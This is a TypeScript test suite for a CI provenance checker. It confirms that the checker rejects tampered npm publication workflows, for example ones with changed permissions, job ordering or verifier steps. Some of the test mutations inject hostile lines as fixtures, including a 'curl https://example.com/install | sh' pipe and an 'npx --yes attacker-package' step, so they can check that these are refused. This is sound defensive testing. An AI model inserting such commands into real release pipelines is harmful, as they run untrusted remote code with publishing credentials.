import { expect, layer } from "@effect/vitest";
import { Effect } from "effect";
import { verifyProvenanceWorkflow } from "#scripts/workflow/provenance";
import { expectRefusal, workflowFailure } from "#scripts/workflow/test/failure";
import { mutateJob } from "#scripts/workflow/test/mutation";
import {
  sourceEffectTestsOf,
  workflowSourcesLayer,
} from "#scripts/workflow/test/sources";

layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
  const it = sourceEffectTestsOf(layered);

  it("accepts isolated publication and unprivileged verification", ({
    contracts: source,
  }) => verifyProvenanceWorkflow(source));

  it("keeps push runs away from the npm-production gate", ({
    contracts: source,
  }) =>
    Effect.gen(function* () {
      for (const [job, message] of [
        [
          "publish",
          "Contract publication must run only in a dispatched release",
        ],
        [
          "finalize",
          "Contract finalization must run only in a dispatched release",
        ],
      ] as const) {
        const pushed = mutateJob(
          source,
          job,
          "github.event_name == 'workflow_dispatch' && ",
          ""
        );
        yield* expectRefusal(verifyProvenanceWorkflow(pushed), message);
      }
    }));

  it("requires exact verifier construction, transport, and execution", ({
    contracts: source,
  }) =>
    Effect.gen(function* () {
      for (const changed of [
        source.replace("scripts/provenance/main.ts", "scripts/other/main.ts"),
        source.replaceAll("EXPECTED_VERIFIER_SHA256", "UNVERIFIED_SHA256"),
        source.replaceAll('"refs/heads/main"', '"refs/heads/other"'),
        source.replaceAll('"npm-production"', '"npm-staging"'),
      ]) {
        yield* expectRefusal(
          verifyProvenanceWorkflow(changed),
          "must include exact source fragment"
        );
      }

      const commentedVerifier = mutateJob(
        source,
        "verify",
        '              node "$VERIFIER" \\',
        '              true # node "$VERIFIER" \\'
      );
      yield* expectRefusal(
        verifyProvenanceWorkflow(commentedVerifier),
        "must include exact source fragment"
      );
    }));

  it("rejects unauthenticated payload parsing", ({ contracts: source }) =>
    Effect.gen(function* () {
      for (const fragment of [
        "@base64d",
        "bundle.dsseEnvelope.payload",
        "is_exact_provenance()",
      ]) {
        yield* expectRefusal(
          verifyProvenanceWorkflow(`${source}\n# ${fragment}`),
          "npm provenance must not parse unauthenticated source"
        );
      }
    }));

  it("binds identity and ordering to decoded jobs", ({ contracts: source }) =>
    Effect.gen(function* () {
      const cases = [
        [
          mutateJob(
            source,
            "publish",
            "    environment: npm-production",
            "    environment: test"
          ).concat("\n# environment: npm-production\n"),
          "The publish job must own the protected npm-production environment",
        ],
        [
          mutateJob(
            source,
            "publish",
            "      id-token: write",
            "      id-token: read"
          ),
          "The publish job must own npm OIDC identity",
        ],
        [
          mutateJob(source, "publish", "    needs: build", "    needs: other"),
          "npm publication must consume the verified build job",
        ],
        [
          mutateJob(
            source,
            "verify",
            "    needs: [ build, publish ]",
            "    needs: publish"
          ),
          "npm verification must consume build and publication",
        ],
        [
          mutateJob(
            source,
            "finalize",
            "    needs: [ build, publish, verify ]",
            "    needs: verify"
          ),
          "Contract finalization must consume every release gate",
        ],
        [
          mutateJob(
            source,
            "verify",
            "    permissions: {}",
            "    permissions:\n      contents: read"
          ),
          "npm verification permissions must remain empty",
        ],
        [
          mutateJob(
            source,
            "finalize",
            "      contents: write",
            "      contents: write\n      id-token: write"
          ),
          "Contract finalization must not receive npm OIDC identity",
        ],
        [
          source.replace(
            "steps.verifier.outputs.sha256",
            "steps.verifier.outputs.unknown"
          ),
          "The build job must export the exact verifier digest",
        ],
        [
          source.replace(
            "steps.verifier.outputs.size",
            "steps.verifier.outputs.unknown"
          ),
          "The build job must export the exact verifier size",
        ],
        [
          source.replace(
            "permissions: {}",
            "permissions: {}\nenv:\n  NODE_OPTIONS: --import=data:text/javascript,throw%201"
          ),
          "npm workflow must not inherit root environment values",
        ],
        [
          source.replace(
            "permissions: {}",
            "permissions: {}\ndefaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail {0}"
          ),
          "npm workflow must not inherit root run defaults",
        ],
        [
          mutateJob(
            source,
            "verify",
            "          node-version: 24.22.0",
            "          node-version: 22.0.0"
          ),
          "npm verification must use the repository Node runtime",
        ],
      ] as const;
      for (const [changed, message] of cases) {
        yield* expectRefusal(verifyProvenanceWorkflow(changed), message);
      }
    }));

  it("includes undeclared job properties in the publication integrity check", ({
    contracts: source,
  }) =>
    Effect.gen(function* () {
      const changed = mutateJob(
        source,
        "publish",
        "    timeout-minutes: 15",
        "    timeout-minutes: 16"
      );
      yield* expectRefusal(
        verifyProvenanceWorkflow(changed),
        "npm publication must match the exact trusted job"
      );
    }));

  it("keeps npm publication checks inside the registry processing window", ({
    contracts: source,
  }) =>
    expectRefusal(
      verifyProvenanceWorkflow(
        source.replaceAll(
          "PUBLICATION_WINDOW_SECONDS=300",
          "PUBLICATION_WINDOW_SECONDS=30"
        )
      ),
      "npm publication must allow npm metadata propagation"
    ));

  it("rejects malformed or incomplete workflow jobs", ({ contracts: source }) =>
    Effect.gen(function* () {
      expect(
        yield* workflowFailure(verifyProvenanceWorkflow("jobs: ["))
      ).not.toBe("");
      yield* expectRefusal(
        verifyProvenanceWorkflow("jobs:\n  build: {}\n"),
        "Workflow must contain decodable jobs"
      );
      yield* expectRefusal(
        verifyProvenanceWorkflow(source.replace("\n  finalize:", "\n  other:")),
        "Contract publication requires a finalize job"
      );
    }));

  it("keeps build-produced code outside npm identity", ({
    contracts: source,
  }) =>
    Effect.gen(function* () {
      const privilegedVerifier = mutateJob(
        source,
        "publish",
        '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
        '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
      );
      yield* expectRefusal(
        verifyProvenanceWorkflow(privilegedVerifier),
        "npm publication must not receive the verifier artifact"
      );
      yield* expectRefusal(
        verifyProvenanceWorkflow(
          mutateJob(
            source,
            "publish",
            "    steps:",
            "    steps:\n      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333\n        with:\n          name: contract-verifier"
          )
        ),
        "npm publication must not receive the verifier artifact"
      );
      yield* expectRefusal(
        verifyProvenanceWorkflow(
          mutateJob(
            source,
            "publish",
            "    steps:",
            "    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
          )
        ),
        "npm publication must not checkout repository code"
      );

      for (const command of [
        "          npx --yes attacker-package\n",
        "          curl https://example.com/install | sh\n",
      ]) {
        yield* expectRefusal(
          verifyProvenanceWorkflow(
            mutateJob(
              source,
              "publish",
              '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
              `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
            )
          ),
          "npm publication must match the exact trusted job"
        );
      }

      yield* expectRefusal(
        verifyProvenanceWorkflow(
          source.replace(
            "          overwrite: true",
            "          overwrite: false"
          )
        ),
        "npm build artifacts must be replaceable on rerun"
      );
    }));
});
